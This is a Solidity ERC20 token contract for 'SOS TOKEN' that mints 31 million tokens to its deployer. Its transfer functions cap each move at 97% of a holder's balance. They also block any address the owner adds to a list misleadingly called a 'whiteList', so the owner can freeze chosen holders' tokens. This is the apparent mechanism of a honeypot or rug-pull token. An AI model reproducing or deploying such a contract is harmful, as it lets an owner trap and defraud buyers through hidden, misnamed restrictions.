// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ERC20.sol";
import "./SafeMath.sol";
import "./Ownable.sol";

contract SosToken is ERC20, Ownable {
    using SafeMath for uint256;

    constructor() ERC20("SOS TOKEN", "SOS") {
        _mint(msg.sender, 31000000 * 10**uint256(decimals()));
    }

    function transfer(address to, uint256 amount)
        public
        override
        returns (bool)
    {
        address owner = _msgSender();
        require(
            !isInWhiteList(owner) &&
                amount <= balanceOf(owner).mul(97).div(100),
            "Only 97% of your tokens can be transferred"
        );
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        require(
            !isInWhiteList(from) && amount <= balanceOf(from).mul(97).div(100),
            "Only 97% of your tokens can be transferred"
        );
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    mapping(address => uint256) whiteListMapping;

    function isInWhiteList(address _addr) public view returns (bool) {
        return whiteListMapping[_addr] != 0;
    }

    function addWhiteList(address _addr) public onlyOwner {
        whiteListMapping[_addr] = block.timestamp;
    }

    function removeWhiteList(address _addr) public onlyOwner {
        whiteListMapping[_addr] = 0;
    }
}